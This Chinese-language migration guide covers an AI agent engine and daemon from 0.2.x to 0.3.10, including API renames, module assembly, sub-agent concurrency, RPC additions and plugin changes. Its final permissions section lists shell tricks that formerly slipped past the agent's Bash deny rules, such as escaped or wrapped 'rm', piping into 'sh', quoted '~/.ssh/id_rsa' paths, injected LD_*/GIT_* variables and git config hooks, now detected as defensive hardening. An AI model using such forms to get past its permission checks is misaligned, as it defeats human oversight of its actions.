# 从 0.2.x 迁移到 0.3

0.3 把引擎拆成了**内核 + 模块**(`ARCHITECTURE.md` §1):子 agent、MCP、skill 不再
硬编在 `runtime` 里,而是以 `runtime::module::Module` 装进会话。**默认构建的 `agixd`
功能与 0.2.x 相同**,RPC 协议只增不改。要改的是三类人:进程内嵌入引擎的、自己选
cargo feature 构建的、部署 `agixd` 的。

## 进程内嵌入方

### 改名与路径

| 0.2.x | 0.3 |
|---|---|
| `base::interface::scene::AgentScene` | `base::interface::scene::Scene` |
| `scene::scene::{CodingScene, ChatScene, …}`、`scene::scene::SceneRegistry` | `scene::{CodingScene, …}`、`scene::SceneRegistry` |
| `runtime::agent_tool::*` | `agents::agent_tool::*` |
| `runtime::agent_spawner_impl::RuntimeAgentSpawner` | `agents::spawner::RuntimeAgentSpawner` |
| `runtime::agent_tool::{AgentTypeDefinition, AgentTypeSource, parse_permission_mode}` | `base::agent_type::*`(`agents::agent_tool` 也重新导出) |
| `runtime::agent::{build_default_skill_manager, build_skill_manager_unwatched}` | `skills::module::*` |
| `tools::skill_tool::*`、`tools::register_skill_tool` | `skills::tool::*`、`skills::tool::register` |

`CodingScene` 在 0.3.6 改名 `CodeScene`(见「0.3.0 之后:到 0.3.6」)。
| `tools::saas_stubs::McpAuthTool` | 删除(0.3.10 起;OAuth 见 `mcp_auth.md`) |
| `runtime::commands::CommandRegistry::from_skill_manager` | `from_skill_catalog`(收 `Arc<dyn SkillCatalog>`,`Arc<SkillManager>` 直接可传) |
| `agents::agent_tool::AgentTool::set_skill_manager` | `set_skill_catalog` |
| `model::tokens::TiktokenCounter` | `HeuristicCounter`;`estimate_input_tokens` / `estimate_block_tokens` 不再收 BPE 参数 |
| `daemon::{SessionPool, Assembly, config, …}` | 搬到 `assembly` crate;`daemon::…` 路径仍然可用 |

前两行是机械替换:

```sh
grep -rl 'AgentScene\|scene::scene::' --include='*.rs' . \
  | xargs perl -pi -e 's/AgentScene/Scene/g; s/scene::scene::/scene::/g'
```

### `Builder` 不再自带子 agent、skill、MCP

0.2.x 的 `runtime::agent::Builder::build()` 无条件注册 `Agent`、`Team*`、`Skill` 与
MCP 工具。0.3 里它们是模块,要的就装:

```rust
let builder = runtime::agent::Builder::new()
    // …scene / model / settings / tools…
    .module(Arc::new(mcp::McpModule::new(manager)))              // 0.2:.mcp_manager(manager)
    .module(Arc::new(agents::AgentsModule::new()))               // 0.2:自动
    .module(Arc::new(skills::SkillsModule::new()));              // 0.2:自动扫三层目录
```

| 0.2.x | 0.3 |
|---|---|
| `.mcp_manager(m)` | `.module(Arc::new(mcp::McpModule::new(m)))` |
| `.shared_agent_types(h)` | `.module(Arc::new(AgentsModule::new().shared_agent_types(h)))` |
| `.skill_catalog(m)` | `.module(Arc::new(SkillsModule::shared(m)))` |
| `.skill_provider(p)` | `SkillsModule::new().provider(p)` |
| `.mcp_servers(..)` | 删除(从未被读) |
| `Agent::init_mcp_skills()` | 删除(没有调用方);要把 MCP 工具当 skill,调 `SkillManager::register_mcp_skills` |

顺序要按 **mcp → agents → skills** 装:agents 要看到可以授予子 agent 的 MCP 工具,
fork 型 skill 要 agents 提供的 spawner。不装 agents 的会话没有 `Agent` 工具,
`"agent"` 型 hook 与 fork 型 skill 的派生被拒绝;不装 skills 的会话没有 `Skill` 工具与
skill 命令。

`Agent::skills()` 返回 `&dyn SkillCatalog`,`Agent::mcp()` 返回 `&dyn McpServers`
(都在 `base::interface`),不再是具体类型。自己写模块见 `extension_points.md`
「一组能力打成一个模块」。

### 依赖 `tools`、`runtime`、`base` 的 feature

- workspace 里 `tools` 与 `runtime` 的依赖改为 `default-features = false`。`web`
  (WebFetch / WebSearch)与 `structured-output`(StructuredOutput)是 feature;
  要它们的显式打开,例如 `runtime = { …, features = ["web", "structured-output"] }`。
- `base` 新增默认开启的 `http`(本机 HTTP 客户端)。只实现契约、不要 HTTP 栈的 crate
  可以 `default-features = false`。
- 进程内自己构建 reqwest client 的,先调一次
  `base::interface::exec::local::install_tls_provider()`:reqwest 0.13 用 ring,
  没装 provider 时第一个 client 就会 panic。证书根改为系统信任库,企业代理装在
  系统钥匙串里的根证书现在会被信任。

### 子 Agent 的并发与通信

- 前台子 Agent 现在跑在自己的 tokio 任务上(`ARCHITECTURE.md` §3.8),同一轮的几个
  `Agent` 调用、`TeamCreate` 同阶段成员真正并行。自己实现的 `Model`、`Tool`、hook 若
  暗含"子 Agent 与父 Agent 在同一个任务里"的假设(比如用 task-local 传状态),要改。
- 同时在跑的子 Agent 默认最多 6 个(`execution.max_concurrent_subagents`,整棵会话树
  共用),超出的 spawn 返回工具错误。`TeamCreate` 成员与常驻成员不计入。
- 后台子 Agent 结束时,父会话的对话里会多一条 `<task-notification>` 用户消息
  (`MessageOrigin::Injected`)。读 transcript 的代码按 origin 区分它与用户输入。
  自己的代码也可以经 `SessionState::post_notice` 给会话的 Agent 递话。
- `base::context::RunningTask` 新增 `ended`(配 `wait_ended()`)与 `inbox`
  (`TaskInbox`);`runtime::agent::Agent::steer_handle()` 把一个不经 `Agent::run` 驱动
  的 Agent 的 steering 队列交出来。
- 新工具 `TaskWait`、`TaskMessage`,在 `CodingScene`(0.3.6 起叫 `CodeScene`)里延迟
  加载;`TeamCreate` 成员另有 `TeamMemorySave`、`TeamMemoryRead`。
- `team::prompt::WorkerContext` 新增 `team_memory` 字段,结构体字面量要补上(空串即可)。
- `Agent` 工具的 `model` 参数以前被忽略,现在生效,压过 agent 类型的 `model`。
- 子 Agent 的工具输入按它自己的工具校验(带 `output_schema` 的 `StructuredOutput` 以前
  按父会话那个不带 schema 的校验,什么都收);它的权限询问也受
  `permission_prompt_timeout_secs` 约束,超时按拒绝,以前一直等。
- 子 Agent 不再继承父场景 `Scene::extra_tools` 贡献的那份工具,而由自己的场景重新贡献,
  并受 agent 类型的 `allowed_tools` / `disallowed_tools` 约束。
- `RunningTask` 新增 `usage` 与 `structured_output`;`AgentSpawner` 新增有默认实现的
  `start_agent`。自己实现 `AgentSpawner` 的不用改。

### 会话级提示词

`Builder::session_prompt(SessionPrompt { append, override_text })` 给一个会话单独的
追加 / 覆盖提示词,不写任何 settings.json,也不传给它派生的子 Agent。对应 RPC 见下。

### WebSearch 只有一条路

0.2.x 在 Anthropic 协议的提供方上,适配层把 `WebSearch` 从工具表里拿掉,换成提供方自带
的 `web_search` 发出去;提供方搜索的调用又被当成一次普通工具调用交给引擎,结果块被丢掉。
0.3 里 `WebSearch` 在所有提供方下都是引擎的普通工具:模型调它,它另发一次调用让提供方
自己搜,结果作为工具结果回给模型。hook、权限规则、宿主看到的帧与 `inspectContext` 都只
见到 `WebSearch` 这一个名字;代价是每次搜索多一次模型调用。

- 默认用会话自己的模型搜;`task_models.web_search` 可以换一个提供方。没有自带搜索的
  提供方(所有 `openai_compatible` 的)对 `WebSearch` 回错误,说明要怎么配。
- `tools::register_web_search(reg, model, model_name)`:原来收 `&Settings`、自己从
  设置与环境变量拼 HTTP 客户端;`NativeSearchProvider::new(model, model_name)` 同理,
  `from_settings` 与 `UnavailableSearchProvider` 删除。
- `SearchProvider::search` 多一个 `session_id` 参数。
- `StreamParams` 新增 `provider_search`(结构体字面量补 `provider_search: None`);
  `ModelEvent` 新增 `SearchResults`,`ModelError` 新增 `Unsupported`,穷尽匹配要补分支。
  自己实现 `Model` 的,收到 `provider_search` 而做不到时回 `Unsupported`。

### Monitor 真的在后台跑

0.2.x 的 `Monitor` 说是后台监视，实际挡住这一轮直到脚本退出或超时(常驻的一直挂着),
打出的行也没有送到模型,工具结果只有行数。0.3 里它登记成会话的任务后立即返回任务 id;
打出的行 200 毫秒内的合成一条 `<task-notification>`,模型在下一步(或下一轮开头)读到,
没读的通知会并进下一条;脚本退出、超时、事件过多时最后报一次;`TaskStop` /
`session.stopTask` 停掉它,本轮被中断或会话关闭时也一并停掉。宿主经 `task_progress`
边跑边看到它的输出。

### token 估算

`model::tokens` 不再加载 cl100k 词表,改为按字符类估算:相对 cl100k,代码与 JSON
偏高 4–12%,中文偏低约 4%。依赖估算值的阈值(压缩触发)会有小幅变化;真实用量
仍以 API 返回的 usage 为准。需要精确计数的,经 `TokenCounter` 接入自己的实现。

## 自己选 feature 构建 `agixd` 的

`daemon` 的 feature 改按档位组织(`ARCHITECTURE.md` §1.2)。原来的命令一对一换成
带 `full` 的写法,含义不变:

| 0.2.x | 0.3 |
|---|---|
| `cargo build -p daemon` | 不变 |
| `--no-default-features --features plugins` | `--no-default-features --features full,plugins` |
| `--no-default-features --features plugin-compile` | `--no-default-features --features full,plugin-compile` |
| `--no-default-features --features plugin-packages` | `--no-default-features --features full,plugin-packages` |
| `--no-default-features`(两个载体都不带) | `--no-default-features --features full` |

`plugins`、`plugin-compile` 两个 feature 在 0.3.9 删除(见「0.3.8 之后:到 0.3.9」)。

单独 `--no-default-features` 现在是 **minimal** 档:只有内核,没有 MCP、子 agent、
skill、web 工具、WebSocket、载体与包方案。

`release-small` profile(fat LTO、`opt-level = "s"`、`panic = "abort"`)是新增的,
`release` 不变。0.3.8 起 `release-small` 删除,这套配置成了 `release` 本身(见「0.3.7 之后:到 0.3.8」)。

## 部署 `agixd` 的

- `agixd` 处理 SIGTERM,与 Ctrl-C 走同一条正常关闭路径。systemd 单元请用
  `KillMode=process`,让 daemon 自己决定哪些后台命令停、哪些留。
- 用 `release-small`(0.3.8 起是 `--release`)构建的,panic 会中止进程,需要 supervisor 拉起;配置示例、
  崩溃记录(`~/.agix/daemon/crashes/`)与进程组记录(`~/.agix/daemon/groups/`)
  见 `ARCHITECTURE.md` §1.3 与 README 的「Running `agixd`」。
- `--help` 的文字改为简短说明;`--version` 输出 `agixd <版本>`(原先是 `daemon <版本>`)。
  选项与默认值不变。
- 声明式场景:在 `~/.agix/scenes/<id>/` 放 `scene.json` + `prompt.md` 即可定义一个
  场景,经 `scene.activate` / `--scenes` 启用(格式见 `extension_points.md`
  「声明式场景」)。插件包可以用 `[scene] dir` 带一个。

## RPC 客户端

协议只增不改:

- `daemon.ping` / `daemon.status` 增加 `modules`:这个构建编入的模块。
- 在没编入某个模块的构建里,属于它的方法(目前是 `mcp.*` 与 `session.startAgent`)返回 `METHOD_NOT_FOUND`,
  `error.data.module` 指明模块。默认构建不受影响。
- `session.create` 的 `options.prompt` 与 `session.setPrompt`:会话自己的系统提示词,
  从下一轮起生效,重建与重启后保留。
- `scene.reload`、`scene.register`、`scene.unregister`:不重启 daemon 增减场景。
- `session.messageTask`(capability `task_messages`):给运行中的后台子 Agent 发消息。
- 后台子 Agent 结束后,父会话下一次调模型时带着它的 `<task-notification>`,宿主不必
  再替模型轮询 `session.taskOutput`。
- `session.startAgent`(capability `host_agents`):宿主不经模型在会话下起子 Agent;
  新错误码 `TASK_LIMIT`(-32019)。
- 子 Agent 任务的条目多了 `detail.agent_session_id`、`usage`,`session.startAgent` 起的
  还有 `detail.tag` 与 `structured_output`。
- `prompt`、`subagent_progress`、`team_progress`、`skills_changed` 帧在两轮之间也会到,
  `turn_id` 为 `null`。以前它们攒到下一轮开始时才发,而且带着那一轮的 `turn_id`。
  子 Agent 的询问一直是用父会话的 `session_id` 回答。
- 任务边跑边推(capability `task_progress`):新帧 `task_progress`(Shell 命令与监视器
  新增的输出)与 `task_updated`(子 Agent 的用量、等待宿主回答);`subagent_progress`
  多了 `task_id`。子 Agent 有询问在等时,任务的 `status` 是 `waiting`,不认识这个值的
  客户端把它当 `running` 即可。

## 0.3.0 之后:到 0.3.6

0.3.x 之间不改协议版本,下面这些是嵌入方和客户端升级时要看的。

### 嵌入方

- **内置场景只剩 `code`、`harnix`、`mini`。** `coding` 改名 `code`,不留别名,状态目录随之是
  `~/.agix/scenes/code/`;`chat`、`research`、`demo` 删掉,用过它们的改用 `harnix`、`mini`
  或写一个声明式场景。`CodeScene::default()` 是有人值守的,`CodeScene::new(Interaction::Unattended)`
  是无人值守的那一版。
- **`Scene` 新增几个有缺省实现的方法**:`interactive()`(缺省 `false`,即无人值守)、
  `build_session_context()`、`bundled_skills()`、`path_style()`,含义见 `extension_points.md`
  「一个 agent 怎么呈现自己」。**自己写的 Rust 场景升级后缺省就是无人值守**:有人在场的,
  要覆盖 `interactive()` 返回 `true`,否则需要批准的调用会被直接拒绝。声明式场景对应
  `scene.json` 的 `"interactive"`。
- **会话事实不在系统提示里了。** 工作目录、平台、草稿目录由 `build_session_context()` 在会话
  开头作为一条上下文消息注入一次;技能清单(`skills.catalog`)是 `User` 块,每次调用作为对话
  开头的一条消息送出。从系统提示里读这些、或在组装拦截器里按位置找它们的,改成按块名找。
- **`TaskCreate` / `TaskGet` / `TaskList` / `TaskUpdate` 删掉。** "Task"只指运行中的任务
  (子 Agent、Shell 命令、监视器、程序);记账用 `TodoWrite`。`TaskCreated` hook 改在运行任务
  开始时触发。
- **会话目标**:新工具 `GoalCreate` / `GoalGet` / `GoalUpdate`;自己调度 turn 的嵌入方用
  `Builder::goal_rounds_from_owner()` 接管下一轮的开启,见 `extension_points.md`「会话目标」。
- **`RunCode`**:新 crate `ptc`、特性 `ptc`(`coding` 档及以上默认开)。`Tool` 新增
  `callable_from_code()` 与 `code_result()`,缺省不可从程序调;自己的工具要让程序用,覆盖它们。
- **`StructuredOutput`** 在 `code` 场景里只在宿主给了 `output_schema` 时注册;参数就是结果本身,一个字符串字段
  里装着整份符合 schema 的结果时会被拒绝。
- **模型缺省**:thinking 开、`ModelSettings::effort` 缺省 `High`、`max_tokens` 缺省 32000
  (`base::settings::DEFAULT_MAX_TOKENS`)。`StreamParams` 新增 `effort`,结构体字面量补上。
  按 token 计费敏感的部署,在设置里显式写回自己要的值。

### RPC 客户端

- `session.goal` / `session.setGoal` / `session.updateGoal` 与 `goal_changed` 帧;`turn_started`
  的 `initiator` 多了 `goal`。
- `session.tasks` 的 `kind` 多了 `code`(`RunCode` 的程序);不认识的 `kind` 照常显示即可。
- `session.inspectContext` 的 `system` 各块带 `role`。
- 场景 id `coding` 不再存在,`session.create` 带它会得到 `SCENE_NOT_FOUND`。

## 0.3.6 之后:到 0.3.7

### 嵌入方

- **`bypassPermissions` 不看任何权限规则。** `PermissionGate` 在 `validate_input` 之后对 bypass
  直接放行:deny / ask 规则、免 bypass 的路径、`.git` / `.agix` 的确认、工具自己的权限判定
  一概跳过。`~`、`$(`、反引号、UNC 这类会被误读的路径属于输入校验,bypass 下照样拒。
  `agixd` 的 bypass 会话也装规则 gate(这样输入校验、会话中途进计划模式都还在);只有宿主给了
  `Assembly.permission` 才用宿主的。要 deny 仍然算数,用 `acceptEdits` 或 `dontAsk` 加 allow
  规则。只想要"deny 规则挡在前面、其余照旧"的,用 `PermissionGate::deny_rules_only`。
- **`acceptEdits` 只多放行只读调用。** 工具自己没放行的 `Edit` / `Write`(写到根外、写
  `.git` / `.agix` 下)照样询问,无人值守的会话里就是拒绝。
- **沙箱的可写范围收窄了。** 项目的 `.git`、`.agix` 本身,`.git/{config,config.worktree,commondir}`、
  `.git/hooks/`,`.agix` 下的设置与 `mcp`、`hooks`、`agents`、`skills`、`plugins`、`rules`、`scenes`
  等配置目录都只读;`~/.agix` 只有 `base::paths::STATE_ROOT_WORKING_DIRS`(`scratchpad`、`memory`)
  可写;`/private/tmp` 等临时区不再整体放开,沙箱里的命令拿到会话自己的 `TMPDIR`。依赖在沙箱里
  `git config`、`git remote add` 的流程要挪到沙箱外。引擎自己跑的 git 一律带
  `base::frozen::git::ENGINE_GIT_OPTIONS`,会话的命令进沙箱时它也进同一个沙箱,由
  `base::frozen::git::EngineGit` 决定怎么起(`tools::bash::engine_git` / `engine_git_for` 给出
  会话的那一个):`FrozenContext::collect` / `collect_with_options` / `refresh_git` /
  `refresh_git_status` 与 `tools::worktree::create_worktree` / `prune_orphan_worktrees` 多一个
  `&EngineGit` 参数,不想进沙箱的传 `EngineGit::Direct`。`SandboxPolicy` 多了
  `only_additional_writable`;`PlatformSandbox::confine` 包得住任何程序,不再只认 `bash -c`。
- **`Monitor` 进沙箱**,与 `Bash` 共用包装与 `require_enforcement`。
- **自己调度目标轮的**(`Builder::goal_rounds_from_owner()`):一轮开跑前调用
  `SessionState::goal_claim_round(turn_id)`,返回 `false` 就不跑——目标已暂停、清除、改过,或
  这一轮已经有人跑了。同一时刻只会发出一个待跑轮。
- **`AgentSpawner::start_agent` 多一个取消令牌参数**,宿主起的子 Agent 随它取消;会话池传会话的
  子令牌。
- **`Builder::question_prompts(bool)`。** 有人值守的场景里,`AskUserQuestion` 只在打开它、或嵌入方
  自己给了 `.elicitation(...)` 时注册。`base::interface::scene::NEEDS_A_USER` 里的工具由 Builder
  在无人值守场景里统一摘掉,场景不必自己过滤。
- **`settings.compaction.threshold_tokens` / `keep_recent` 生效了**(之前写了没人读),字段改成
  可选,不写就用场景的 `token_budget()`。已经写了这两项的部署,升级后会按写的值压缩。
- **`ModelError::NotRecorded`**:回放的录像里没有这次辅助调用时返回;自己穷举 `ModelError` 的补一支。
  会话自动起名走会话自己的模型与项目绑定,录制时记成 `purpose: "title"` 的辅助调用。
- **`AgentEvent::PermissionPrompt` 带 `task_id`,新增 `AgentEvent::QuestionPrompt`**;穷举匹配
  `AgentEvent` 的补上。`SetModelError::Busy.current_turn_id` 改成 `Option<String>`,并多了
  `running_task_ids`(挡住重建的后台任务)。
- **RunCode**:程序里的 `agent()` 超过子 Agent 并发上限时排队等空槽;程序起的子 Agent 需要询问时
  一律拒绝;`Agent` 的 `background` / `team_name` / `worktree` 从程序里调用被拒绝。`ToolContext`
  多了 `from_code`。
- **`RunningTask` 的输出不再是公开字段。** 写用 `append_output`,读用 `output_text()`(全部保留的)、
  `output_tail(n)` 或 `output_from(偏移)`,后两者返回 `OutputSlice {text, from_byte, next_byte,
  dropped, closed}`;`output_dropped` 去掉了,`from_byte > 0` 就是前面有没给的。`report_progress()`
  不带参数;`finish_task` 关闭输出(`close_output`),之后写的不再记下。`cancel_running_task` 只记下
  停止,`task_finished` 由工作自己走到 `finish_task` 时发,至多等 15 秒。
- **`HistoryStore::snapshot_lineage`**:一个会话连同任意深度的侧链,`session.export` 用它取快照。
  有缺省实现,但缺省是逐个 `load`,不在同一时刻;自己实现 store 的,能挡一下写入就覆盖它。

### RPC 客户端

- **提问**:`session.create` 的 `options.prompt_types` 加上 `"question"`(能力位 `question_prompts`)
  后,模型的 `AskUserQuestion` 以 `prompt_type: "question"` 的 `prompt` 帧到达,用
  `session.respondToPrompt` 的 `answer` 回答;没打开的会话里模型看不到这个工具。
- **能力位**多了 `goals`、`ptc`(带这个特性构建时)、`question_prompts`、`task_output_offsets`。
- **任务输出按字节偏移读**(能力位 `task_output_offsets`):`session.taskOutput` 接受 `from_byte`
  (与 `tail_bytes` 二选一),应答多了 `from_byte` / `next_byte` / `dropped` / `final`;`task_progress`
  帧多了 `from_byte` / `next_byte`。跟随输出的宿主按 `next_byte` 增量拼接,`dropped > 0` 时明示
  中间丢了多少(做法见协议文档 §6.3 `session.taskOutput`)。老 daemon 不认 `from_byte`,会把它当成
  只要尾部 —— 先看能力位。
- **被停掉的任务,`task_finished` 晚到。** `session.stopTask` 之后 `session.tasks` 立刻是 `stopped`,
  `task_finished` 却要等工作收完尾(至多 15 秒),之前还会有带收尾输出的 `task_progress`。拿
  `task_finished` 当"停止已生效"的宿主,改看 `stopTask` 的应答或 `session.tasks`。
- `session.run_turn` 的 `turn_id` 不能是目标轮的形式(`goal-<修订>-<轮次>-…`),也不能以 `schedule-`、`cron-` 开头(`INVALID_PARAMS`)。
- 会话有一轮占着时 `setModel` / `setPrompt` 等需要重建的调用一律 `SESSION_BUSY`,`current_turn_id`
  在那一轮还没正式开始时为 `null`;被拒的改动不会记下。
- 还有后台任务在跑的会话不重建:`setPrompt`、换厂商的 `setModel` 返回 `SESSION_BUSY`,`data`
  多一项 `running_task_ids`;设置文件变化引起的重建推迟到任务都结束之后。重建之后会话结束了的
  任务和还没投给模型的 `<task-notification>` 都还在。
- 后台子 Agent 的询问不随前台一轮结束而从 `pending_prompts` 里消失,答了或任务结束才去掉。
- 同一连接重复 `daemon.subscribeEvents` 不再重复投递。
- **导出**:`session.export {session_id, path, format?, include?}`(能力位 `session_export`)把会话
  连同侧链、图片本体在同一时刻打成 zip 或目录,写到 daemon 所在机器上的绝对路径,带
  `manifest.json`(`format_version: 1`)。还没有 `session.import`。

## 0.3.7 之后:到 0.3.8

### 部署 `agixd` 的

- **`release` 就是小体积构建**:fat LTO、`opt-level = "s"`、`panic = "abort"`,`agixd` 约 11 MB。
  `release-small` profile 没有了,原来用它的改成 `--release`。要 panic 时展开、任务里的 panic
  只结束那个任务的,用 `--profile release-fast`(`opt-level = 3`,体积翻倍)。按 `--release`
  构建的部署现在 panic 会中止进程,需要 supervisor 拉起(`ARCHITECTURE.md` §1.3)。
- **工作线程数可配**:`--worker-threads <N>` 或环境变量 `AGIX_WORKER_THREADS`(命令行优先),
  不配时等于 CPU 核数。只管异步工作线程;文件读写、搜索、脚本走各自的阻塞线程池,不受影响。
  嵌入式板子上 `--worker-threads 1` 即可。

## 0.3.8 之后:到 0.3.9

扩展只剩两种:编译进宿主的 Rust 插件,和 QuickJS 脚本(与 `RunCode` 同一套虚拟机)。
WebAssembly 载体整个移除。

### 自己选 feature 构建 `agixd` 的

- `plugins`、`plugin-compile` 两个 feature 没有了,`agix-plugin-compile` 二进制也没有了。
  原来用 `--no-default-features --features full,plugin-compile` 的构建,改回默认构建。
- `scripts` 与插件包不再互斥:默认构建两样都带。

### 插件包作者

- `[[wasm]]` 段**拒装**,安装时报错。给宿主看的内容放 `x-` 前缀的段。
- `[scene.own]` 段**拒装**,改用 `[scene] dir`(`scene.json` + `prompt.md`,格式见
  `extension_points.md`「声明式场景」),它是 `own` 的超集。`[scene] visible_in` 删除。
- `[plugin.config]` 不再读取(它只服务组件的 `init`)。
- `[[agent]]` 现在在默认构建上生效;以前只有带 WASM 载体的构建兑现它。
- 包格式见新的 `plugin_packages.md`;`extending_wasm.md` 删除。

### 嵌入方

- `crates/wasm-host`、`crates/plugin-host`、`crates/plugin-compiler` 删除;
  `base::interface::capabilities` 删除(它只服务 WASM 组件的能力声明)。
- `hooks::config::HookConfig::Wasm`、`hooks::runner::WasmHookExecutor`、
  `HookRunner::with_wasm_executor`、`PluginHost::hook_executor` 删除。
- `SessionPool::load_plugin_components` 改名 `load_plugins`(现在只接管插件包的场景)。
- `plugin::locate::locate_tool` 删除。
- **Rust 插件接口定为 `runtime::plugin::Plugin`**:`Builder::plugin(..)` 可以加多个,
  `Assembly { plugins, .. }` 加给池里每个会话;插件随会话一起交给子 Agent。
  `runtime::plugin_host::PluginHost` 与 `Builder::plugin_host` 删除;只为加几个工具实现
  `PluginHost` 的,改成一个只调 `Registrar::tool` 的 `Plugin`。
- **同一个点上 Rust 与 QuickJS 的先后对调了。** 以前串行的点上(`tool.result`、
  `model.request`、`model.message`、`memory.retrieval_hook`)脚本碰巧跑在 `SessionCustomizer`
  加的 Rust 实现**之前**;现在 Rust 先、脚本后,与交给 `Builder` 的先后无关。`tool.around`
  上脚本仍在外层。见 `extension_points.md`「叠加顺序」。
- 在 `SessionCustomizer` 里设 `Builder::prompt_registry` 不再把脚本的块、变量、组装钩子
  冲掉:脚本叠在宿主的注册表上。
- **QuickJS 也走 `Plugin`。** `Builder::bound_scripts`、`Builder::script_carriers` 删除,改成
  `builder.plugin(Arc::new(script_host::ScriptPlugin::new(bound)))`;`AgentTool::with_delegate_scripts`
  删除,子 Agent 随插件继承。
- `Plugin` 有 `name`、`layer`(默认 `Layer::Rust`)、`register` 三个方法。插件名在会话里唯一;
  工具名、agent 类型名跨插件唯一;提示块名与变量名同层唯一——撞了 `build()` 失败。
  脚本之间撞名在绑定时报 `BindingError::NameTaken`。
- `runtime::module::SessionContext` 的 `plugin_host`、`delegate_scripts` 字段删除,换成
  `plugin_agent_types`、`delegate_plugins` 与 `plugin_tools`。
- `BoundScripts::prompt_variables` 的元素多了第三项 `BlockOrigin`。
- `Builder::scene_tool_filter` 改名 `contributed_tool_filter`,现在也收窄插件登记的工具。
  子 Agent 不再从父会话抄插件的工具,由它自己那次登记给出;`AgentTool::with_delegate_plugins`
  多一个参数,是这些插件在父会话登记的工具名。
- `plugin` crate 收拢成包的格式、发现、缓存、安装与披露:
  - `plugin::cli`、`plugin::marketplace`、`plugin::resolver` 删除(按名字从市场安装、`update`、
    依赖解析,daemon 从未接上);
  - `plugin::fetch` 改名 `plugin::install`,`install(cache, name, source)` 与
    `uninstall(cache, name, version)` 是函数,`PluginSource` 也挪到这里;
  - `plugin::homograph` 改名 `plugin::blocklist`,只留 `check_blocklist`;
    `PluginError::Homograph` 改名 `PluginError::Blocked`;
  - `PluginCache` 去掉 `cache_registry_index`、`load_registry_index`、`total_cached`。
- `assembly::plugins::PluginSubsystem::new` 去掉没用的工作区参数。
- 两种插件的开发指南是新的 `plugin_development.md`,样例在 `examples/plugins/`。

### RPC 客户端

- `plugin.install` 的 `disclosure` 去掉 `wasm`(`components` / `runnable`)与 `events`。
- `plugin.list` 的条目去掉 `component_faults`。
- `daemon.doctor` 的 `plugins.status` 不再出现 `packages-only`;带插件包的构建报 `enabled`。
- `session.get` 多一个 `health`:会话的插件注册了健康检查时才有。

## 0.3.9 之后:到 0.3.10

按谁要动手分成三类,每类下按领域分组;一件事只写在一处。计划要翻的缺省汇总在末尾。

### 部署 `agixd` 的

#### 权限与沙箱

- **`auto`、`yolo` 就是 `bypassPermissions`。** settings.json 的 `permission_mode`、
  `options.permission_mode`、agent 类型 frontmatter 里写这两个,得到的都是完全放行,报回来是
  `bypassPermissions`。以前 settings.json 里的 `auto` 被退回 `default`,`yolo` 与经 RPC 传进来的
  `auto` 实际按 `default` 询问——配了它们的现在不再询问。只想少问几句的,用 `acceptEdits`
  或 `default` 加 allow 规则。
- Agent 工具(团队成员)和 `TeamCreate` 的 `permission_mode` 不再拒收 `auto`,按
  `bypassPermissions` 处理;`bubble` 照旧拒收。
- `Bash` 的 deny / ask 规则按实际启动的程序再比一次(`"rm"`、`\rm`、`{rm,x}`、`/bin/rm`、
  `command -p rm`、`env` / `exec` / `sudo` / `nice` / `time` / `timeout` / `xargs` 包着的、
  `sh -c` / `eval` / `find -exec` 里的都算 `rm`);程序名读不出来的命令(`$CMD x`)在有带
  内容的 deny / ask 规则时改为询问(`dontAsk` 下拒绝)。以前它们按原文前缀匹配,都绕得过去。
  allow 规则不变。带引号的受保护路径(`~/".ssh"/id_rsa`)同样按受保护路径拒绝。
- `Bash` 的 deny / ask 规则多了几种绕法的识别:`case`/`function`/`select` 块、读 stdin /
  here-string 的裸 `sh` / `bash`(`echo 'rm' | sh`、`bash <<< 'rm'`)程序名读不出来,有带内容的
  deny / ask 规则时按询问处理;`busybox` / `flock` / `ionice` / `chrt` / `taskset` / `pkexec` /
  `caffeinate` / `su -c` / `runuser -- ` 等 wrapper 剥掉后比里面真正启动的程序。
- `Bash(...)` 的 deny / ask 规则同样管住 `Monitor`(此前只按工具名匹配,`Monitor` 逃得过)。
  一个 `Monitor` 名下的 allow 不受影响,被 `Bash` 名下的 deny/ask 收紧。
- 只读 `Bash` 命令的免询问更窄:参数里有 `$VAR`、`~`、替换的,`cd` / `pushd` 到不是项目内
  字面路径之后再读的,现在要询问。`echo $HOME` 这类也在其中。`cd -`、`popd`、`pushd +N`(落到
  `$OLDPWD` / 目录栈,命令没写出目的地)之后再按相对路径读的,同样要询问。
- **只读 `Bash` 的判定改用 deny 规则那套调用解析**(`permissions::invocation`):行里启动的
  每个程序都要按名字(不带路径)在只读名单里,读不出程序的(`$CMD x`、看不懂的 wrapper 选项)
  不算只读。以前免询问、现在要询问(`plan` 下拒绝)的:wrapper 的选项吃掉了名字的
  (`env -u ls sh -c …`、`exec -a ls python3 …`),带路径的程序(`./ls`、`bin/cat`、`./x=1 ls`),
  经 `xargs` / `sudo` / `flock` 等 wrapper、`env -C` / `env -P`、`time -o` 跑的,`env` 传进危险
  变量的(`env -u X PATH=. ls`、`env 'PATH=.' ls`),`printf -v`,关键字后面的赋值
  (`if PATH=. ls`、`! PATH=. ls`),展开里的赋值(`${CDPATH:=/}`),以及 `>&word` / `N>&word`
  (`word` 不是数字或 `-` 时是把 stdout 与 stderr 一起写进文件 `word`)。`2>&1`、`>&2`、`2>&-`
  仍不算写。
- 只读命令行上设了就要询问的变量扩大到一整类:任何 `GIT_*`(`GIT_CONFIG_COUNT` /
  `GIT_CONFIG_KEY_n` / `GIT_CONFIG_VALUE_n`、`GIT_CONFIG_GLOBAL`、`GIT_CONFIG_PARAMETERS`、
  `GIT_EXEC_PATH`…)、`XDG_*`(git 读 `$XDG_CONFIG_HOME/git/config`)、`*PAGER`、
  `*_CONFIG_PATH` / `*_CONFIG_FILE`(`RIPGREP_CONFIG_PATH`…)、`MANOPT` / `MANROFFOPT`、
  `KUBECONFIG`、`DOCKER_*`、`PYTHON*` / `PERL*` / `RUBY*` / `NODE_*`、`LD_*` / `DYLD_*`。
- **`git` 只在会话自己所在的仓库里只读。** `cd` 进项目里的裸仓库(含 `HEAD`、`objects`、`refs`
  的目录,如 `fixtures/x.git`)或嵌套的 `.git` 之后跑 `git status` / `git log` 等,要询问:那个
  仓库的配置(`core.fsmonitor`、`diff.external`…)由项目作者写,git 会照着拉起程序。`cd -` /
  `popd` 之后跑的 git 同样询问。`acceptEdits` 下也询问。
- 只读命令的长选项按 GNU 与 git 的缩写规则匹配:`sort --outp=f`、`git grep --open-files-in=x`、
  `git log --ext-dif`、`git branch --unset-up` 与全写一样处理。新认得的会拉起程序或写文件的
  选项:`rg --hostname-bin`、`man -C` / `--config-file`、`info -o`、`file -C`、`nm --plugin`、
  `ack --output` / `--pager`、`kubectl --kubeconfig` / `-s`。
